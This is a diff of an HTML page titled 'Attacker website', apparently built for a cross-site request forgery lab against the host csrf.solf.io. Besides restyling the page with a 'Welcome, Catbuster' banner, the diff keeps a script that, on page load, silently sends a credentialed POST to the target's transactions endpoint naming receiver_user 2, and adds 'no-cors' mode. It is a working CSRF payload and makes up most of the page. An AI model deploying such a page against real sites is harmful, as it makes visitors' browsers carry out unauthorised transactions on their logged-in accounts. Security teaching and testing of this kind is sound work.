@@ -2,19 +2,43 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Title</title>
+    <title>Attacker website</title>
 </head>
+<style>
+    html, body {
+        height: 100%;
+        background-image: url("catbuster.jpg");
+        background-repeat: no-repeat;
+        background-size: cover;
+    }
+    .parent {
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .center {
+        text-align: center;
+        background-color: hsla(0, 100%, 90%, 0.3);
+        width: 33%;
+        height: 9%;
+    }
+</style>
 <body>
-    <h1> Attacker website </h1>
+    <div class="parent">
+        <div class="center">
+        <h1> Welcome, Catbuster </h1>
+        </div>
+    </div>
     <script>
-       fetch('https://csrf.solf.io/api/accounts/')
-          .then((response) => {
-            return response.json();
-          })
-          .then((data) => {
-            console.log(data);
-          });
 
+        /*
+        fetch('https://csrf.solf.io/api/accounts/', {
+            credentials: 'include',
+        }).then((response) => {
+            console.log(response)
+        });
+         */
 
         const formData = new FormData();
         formData.append('receiver_user', '2')
@@ -22,6 +46,7 @@
         fetch('https://csrf.solf.io/api/transactions/', {
             method: 'POST',
             body: formData,
+            mode: 'no-cors',
             credentials: 'include', // include, *same-origin, omit
         })
     </script>
